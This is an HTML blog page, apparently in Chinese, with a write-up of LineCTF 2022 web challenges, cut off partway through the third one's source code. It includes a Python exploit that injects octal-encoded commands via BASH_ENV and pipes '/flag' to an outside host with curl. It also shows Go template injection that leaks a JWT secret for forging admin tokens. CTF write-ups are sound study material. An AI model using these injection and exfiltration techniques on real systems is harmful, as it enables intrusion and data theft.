@@ -1,0 +1,803 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -write up -ctf," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言 齐安信的比赛，当时都没发现有这比赛，现在有环境了来尝试复现下。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【LineCTF2022】部分题目复现">
+<meta property="og:url" content="http://example.com/2022/04/17/%E3%80%90LineCTF2022%E3%80%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言 齐安信的比赛，当时都没发现有这比赛，现在有环境了来尝试复现下。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.loli.net/2022/04/17/F2cJgt8AoPjzG4C.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/17/CeiMt251HWoTUVG.png">
+<meta property="og:image" content="https://s2.loli.net/2022/04/18/inZQvpd5GgChTBK.png">
+<meta property="article:published_time" content="2022-04-17T08:08:13.000Z">
+<meta property="article:modified_time" content="2022-04-19T03:24:51.250Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -write up -ctf">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/04/17/F2cJgt8AoPjzG4C.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2022/04/17/【LineCTF2022】部分题目复现/"/>
+
+
+
+
+
+  <title>【LineCTF2022】部分题目复现 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/17/%E3%80%90LineCTF2022%E3%80%91%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">【LineCTF2022】部分题目复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2022-04-17T16:08:13+08:00">
+                2022-04-17
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
+<p>齐安信的比赛，当时都没发现有这比赛，现在有环境了来尝试复现下。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="BB"><a href="#BB" class="headerlink" title="BB"></a>BB</h1><p>审计源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">    error_reporting(0);</span><br><span class="line"></span><br><span class="line">    function bye($s, $ptn)&#123;</span><br><span class="line">        if(preg_match($ptn, $s))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123;</span><br><span class="line">        if(bye($k, &quot;/=/i&quot;) &amp;&amp; bye($v, &quot;/[a-zA-Z]/i&quot;)) &#123;</span><br><span class="line">            putenv(&quot;&#123;$k&#125;=&#123;$v&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    system(&quot;bash -c &#x27;imdude&#x27;&quot;);</span><br><span class="line">    </span><br><span class="line">    foreach($_GET[&quot;env&quot;] as $k=&gt;$v)&#123;</span><br><span class="line">        if(bye($k, &quot;/=/i&quot;)) &#123;</span><br><span class="line">            putenv(&quot;&#123;$k&#125;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<p>复杂的代码审计往往只需要几行朴实无华的代码，比如这段代码。我们发现我们能传入的只有env参数，并且这个参数还不能有字母。这个地方尝试用八进制绕过(whoami)：<br><img src="https://s2.loli.net/2022/04/17/F2cJgt8AoPjzG4C.png"></p>
+<p>接着看这段代码，也十分眼熟啊，直接想到p牛不久前写的文章：<br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/how-I-hack-bash-through-environment-injection.html">我是如何利用环境变量注入执行任意命令</a></p>
+<p>文章详细剖析了原理，这里我们先直接运用BASH_ENV导致的命令注入，示例：<br><img src="https://s2.loli.net/2022/04/17/CeiMt251HWoTUVG.png"></p>
+<p>成功打印了imdude，说明注入点存在，既然如此，我们就可以利用curl反弹shell，exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">cmd = &#x27;cat /flag | curl -d @- xx.xx.xx.xx:2333&#x27;</span><br><span class="line"></span><br><span class="line">o = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for c in cmd:</span><br><span class="line">    if c in string.ascii_letters:</span><br><span class="line">        o += f&quot;$&#x27;\\&#123;oct(ord(c))[2:]&#125;&#x27;&quot; #转八进制</span><br><span class="line">    else:</span><br><span class="line">        o += c</span><br><span class="line"></span><br><span class="line">r = requests.get(f&#x27;http://caa49c7e-c032-4246-9864-b4df0d75fbbc.node4.buuoj.cn:81/?env[BASH_ENV]=`&#123;o&#125;`&#x27;)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<p>监听2333端口，运行exp获取flag。</p>
+<h1 id="gotm"><a href="#gotm" class="headerlink" title="gotm"></a>gotm</h1><p>进入环境一看什么都没有，太爱了，不过给了附件，看了一下是用go语言写的，关键部分代码如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">func auth_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	uid := r.FormValue(&quot;id&quot;)</span><br><span class="line">	upw := r.FormValue(&quot;pw&quot;)</span><br><span class="line">	if uid == &quot;&quot; || upw == &quot;&quot; &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if len(acc) &gt; 1024 &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	user_acc := get_account(uid)</span><br><span class="line">	if user_acc.id != &quot;&quot; &amp;&amp; user_acc.pw == upw &#123;</span><br><span class="line">		token, err := jwt_encode(user_acc.id, user_acc.is_admin)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">		p := TokenResp&#123;true, token&#125;</span><br><span class="line">		res, err := json.Marshal(p)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		w.Write(res)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	w.WriteHeader(http.StatusForbidden)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func regist_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	uid := r.FormValue(&quot;id&quot;)</span><br><span class="line">	upw := r.FormValue(&quot;pw&quot;)</span><br><span class="line"></span><br><span class="line">	if uid == &quot;&quot; || upw == &quot;&quot; &#123;</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	if get_account(uid).id != &quot;&quot; &#123;</span><br><span class="line">		w.WriteHeader(http.StatusForbidden)</span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">	if len(acc) &gt; 4 &#123;</span><br><span class="line">		clear_account()</span><br><span class="line">	&#125;</span><br><span class="line">	new_acc := Account&#123;uid, upw, false, secret_key&#125;</span><br><span class="line">	acc = append(acc, new_acc)</span><br><span class="line"></span><br><span class="line">	p := Resp&#123;true, &quot;&quot;&#125;</span><br><span class="line">	res, err := json.Marshal(p)</span><br><span class="line">	if err != nil &#123;</span><br><span class="line">	&#125;</span><br><span class="line">	w.Write(res)</span><br><span class="line">	return</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func flag_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	token := r.Header.Get(&quot;X-Token&quot;)</span><br><span class="line">	if token != &quot;&quot; &#123;</span><br><span class="line">		id, is_admin := jwt_decode(token)</span><br><span class="line">		if is_admin == true &#123;</span><br><span class="line">			p := Resp&#123;true, &quot;Hi &quot; + id + &quot;, flag is &quot; + flag&#125;</span><br><span class="line">			res, err := json.Marshal(p)</span><br><span class="line">			if err != nil &#123;</span><br><span class="line">			&#125;</span><br><span class="line">			w.Write(res)</span><br><span class="line">			return</span><br><span class="line">		&#125; else &#123;</span><br><span class="line">			w.WriteHeader(http.StatusForbidden)</span><br><span class="line">			return</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func root_handler(w http.ResponseWriter, r *http.Request) &#123;</span><br><span class="line">	token := r.Header.Get(&quot;X-Token&quot;)</span><br><span class="line">	if token != &quot;&quot; &#123;</span><br><span class="line">		id, _ := jwt_decode(token)</span><br><span class="line">		acc := get_account(id)</span><br><span class="line">		tpl, err := template.New(&quot;&quot;).Parse(&quot;Logged in as &quot; + acc.id)</span><br><span class="line">		if err != nil &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		tpl.Execute(w, &amp;acc)</span><br><span class="line">	&#125; else &#123;</span><br><span class="line"></span><br><span class="line">		return</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">func main() &#123;</span><br><span class="line">	admin := Account&#123;admin_id, admin_pw, true, secret_key&#125;</span><br><span class="line">	acc = append(acc, admin)</span><br><span class="line"></span><br><span class="line">	http.HandleFunc(&quot;/&quot;, root_handler)</span><br><span class="line">	http.HandleFunc(&quot;/auth&quot;, auth_handler)</span><br><span class="line">	http.HandleFunc(&quot;/flag&quot;, flag_handler)</span><br><span class="line">	http.HandleFunc(&quot;/regist&quot;, regist_handler)</span><br><span class="line">	log.Fatal(http.ListenAndServe(&quot;0.0.0.0:11000&quot;, nil))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们总共有四个路由，上面的函数分别对应了四个路由的功能，我们最后要在<code>/flag</code>中获取flag，必须满足is_admin == true，那么就要求我们必须传入一个正确的X-Token。</p>
+<p>而在<code>/</code>路由的函数中我们发现go语言的ssti，如果我们能令acc，即id的值为<code>&#123;&#123;.&#125;&#125;</code>，就可以得到secert_key的值，这样就可以伪造jwt了。</p>
+<p>首先我们根据<code>/regist</code>路由的内容注册账号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/regist?id=&#123;&#123;.&#125;&#125;&amp;pw=123</span><br></pre></td></tr></table></figure>
+
+<p>接着根据<code>/auth</code>路由内容登录获取一个token，这个token的is_admin部分是false，我们无法直接使用，但是根据前面的ssti，我们可以访问<code>/</code>路由获取secret_key：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/auth?id=&#123;&#123;.&#125;&#125;&amp;pw=123</span><br><span class="line">return:&#123;&quot;status&quot;:true,&quot;token&quot;:&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6Int7Ln19IiwiaXNfYWRtaW4iOmZhbHNlfQ.0Lz_3fTyhGxWGwZnw3hM_5TzDfrk0oULzLWF4rRfMss&quot;&#125;</span><br><span class="line"></span><br><span class="line">带上token访问/</span><br><span class="line">return：Logged in as &#123;&#123;&#123;.&#125;&#125; 123 false this_is_f4Ke_key&#125;</span><br></pre></td></tr></table></figure>
+
+<p>获取到secret_key的值为this_is_f4Ke_key，看起来还很有迷惑性，接下来伪造jwt：<br><img src="https://s2.loli.net/2022/04/18/inZQvpd5GgChTBK.png" alt="1"></p>
+<p>带上伪造的token访问<code>/flag</code>路由，获取flag。</p>
+<h1 id="Memo-Driver"><a href="#Memo-Driver" class="headerlink" title="Memo Driver"></a>Memo Driver</h1><p>进入页面看起来像是个留言板之类的东西，可以写东西然后保存，再进入<code>/view</code>路由查看，功能大概这么多。</p>
+<p>然后下载附件查看源码，好家伙python写的，这三题用了三个语言写网页，太绝了。源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import hashlib</span><br><span class="line">import shutil</span><br><span class="line">import datetime</span><br><span class="line">import uvicorn</span><br><span class="line">import logging</span><br><span class="line"></span><br><span class="line">from urllib.parse import unquote</span><br><span class="line">from starlette.applications import Starlette</span><br><span class="line">from starlette.responses import HTMLResponse</span><br><span class="line">from starlette.routing import Route, Mount</span><br><span class="line">from starlette.templating import Jinja2Templates</span><br><span class="line">from starlette.staticfiles import StaticFiles</span><br><span class="line"></span><br><span class="line">logger = logging.getLogger()</span><br><span class="line">logger.setLevel(logging.DEBUG)</span><br><span class="line"></span><br><span class="line">templates = Jinja2Templates(directory=&#x27;./&#x27;)</span><br><span class="line">templates.env.autoescape = False</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    memoList = []</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line">        path = &#x27;./memo/&#x27; + clientId</span><br><span class="line">        </span><br><span class="line">        if os.path.exists(path):</span><br><span class="line">            memoList = os.listdir(path)</span><br><span class="line">        </span><br><span class="line">        context[&#x27;request&#x27;] = request</span><br><span class="line">        context[&#x27;ip&#x27;] = request.client.host</span><br><span class="line">        context[&#x27;clientId&#x27;] = clientId</span><br><span class="line">        context[&#x27;memoList&#x27;] = memoList</span><br><span class="line">        context[&#x27;count&#x27;] = len(memoList)</span><br><span class="line">    </span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    return templates.TemplateResponse(&#x27;/view/index.html&#x27;, context)</span><br><span class="line"></span><br><span class="line">def save(request):</span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    memoList = []</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        context[&#x27;request&#x27;] = request</span><br><span class="line">        context[&#x27;ip&#x27;] = request.client.host</span><br><span class="line">        </span><br><span class="line">        contents = request.query_params[&#x27;contents&#x27;]</span><br><span class="line">        path = &#x27;./memo/&#x27; + getClientID(request.client.host) + &#x27;/&#x27;</span><br><span class="line">        </span><br><span class="line">        if os.path.exists(path) == False:</span><br><span class="line">            os.makedirs(path, exist_ok=True)</span><br><span class="line">        </span><br><span class="line">        memoList = os.listdir(path)</span><br><span class="line">        idx = len(memoList)</span><br><span class="line">        </span><br><span class="line">        if idx &gt;= 3:</span><br><span class="line">            return HTMLResponse(&#x27;Memo Full&#x27;)</span><br><span class="line">        elif len(contents) &gt; 100:</span><br><span class="line">            return HTMLResponse(&#x27;Contents Size Error (MAX:100)&#x27;)</span><br><span class="line">        </span><br><span class="line">        filename = str(idx) + &#x27;_&#x27; + datetime.datetime.now().strftime(&#x27;%Y%m%d%H%M%S&#x27;)</span><br><span class="line">            </span><br><span class="line">        f = open(path + filename, &#x27;w&#x27;)</span><br><span class="line">        f.write(contents)</span><br><span class="line">        f.close()</span><br><span class="line">    </span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    return HTMLResponse(&#x27;Save Complete&#x27;)</span><br><span class="line"></span><br><span class="line">def reset(request):</span><br><span class="line">    context = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    try:</span><br><span class="line">        context[&#x27;request&#x27;] = request</span><br><span class="line">            </span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line">        path = &#x27;./memo/&#x27; + clientId</span><br><span class="line">            </span><br><span class="line">        if os.path.exists(path) == False:</span><br><span class="line">            return HTMLResponse(&#x27;Memo Null&#x27;)</span><br><span class="line">        </span><br><span class="line">        shutil.rmtree(path)</span><br><span class="line">            </span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    return HTMLResponse(&#x27;Reset Complete&#x27;)</span><br><span class="line"></span><br><span class="line">def view(request):</span><br><span class="line">    context = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        context[&#x27;request&#x27;] = request</span><br><span class="line">        clientId = getClientID(request.client.host)</span><br><span class="line"></span><br><span class="line">        if &#x27;&amp;&#x27; in request.url.query or &#x27;.&#x27; in request.url.query or &#x27;.&#x27; in unquote(request.query_params[clientId]):</span><br><span class="line">            raise</span><br><span class="line">        </span><br><span class="line">        filename = request.query_params[clientId]</span><br><span class="line">        path = &#x27;./memo/&#x27; + &quot;&quot;.join(request.query_params.keys()) + &#x27;/&#x27; + filename</span><br><span class="line">        </span><br><span class="line">        f = open(path, &#x27;r&#x27;)</span><br><span class="line">        contents = f.readlines()</span><br><span class="line">        f.close()</span><br><span class="line">        </span><br><span class="line">        context[&#x27;filename&#x27;] = filename</span><br><span class="line">        context[&#x27;contents&#x27;] = contents</span><br><span class="line">    </span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    </span><br><span class="line">    return templates.TemplateResponse(&#x27;/view/view.html&#x27;, context)</span><br><span class="line"></span><br><span class="line">def getClientID(ip):</span><br><span class="line">    key = ip + &#x27;_&#x27; + os.getenv(&#x27;SALT&#x27;)</span><br><span class="line">    </span><br><span class="line">    return hashlib.md5(key.encode(&#x27;utf-8&#x27;)).hexdigest()</span><br><span class="line"></span><br><span class="line">routes = [</span><br><span class="line">    Route(&#x27;/&#x27;, endpoint=index),</span><br><span class="line">    Route(&#x27;/view&#x27;, endpoint=view),</span><br><span class="line">    Route(&#x27;/reset&#x27;, endpoint=reset),</span><br><span class="line">    Route(&#x27;/save&#x27;, endpoint=save),</span><br><span class="line">    Mount(&#x27;/static&#x27;, StaticFiles(directory=&#x27;./static&#x27;), name=&#x27;static&#x27;)</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">app = Starlette(debug=False, routes=routes)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    logging.info(&quot;Starting Starlette Server&quot;)</span><br><span class="line">    uvicorn.run(app, host=&quot;0.0.0.0&quot;, 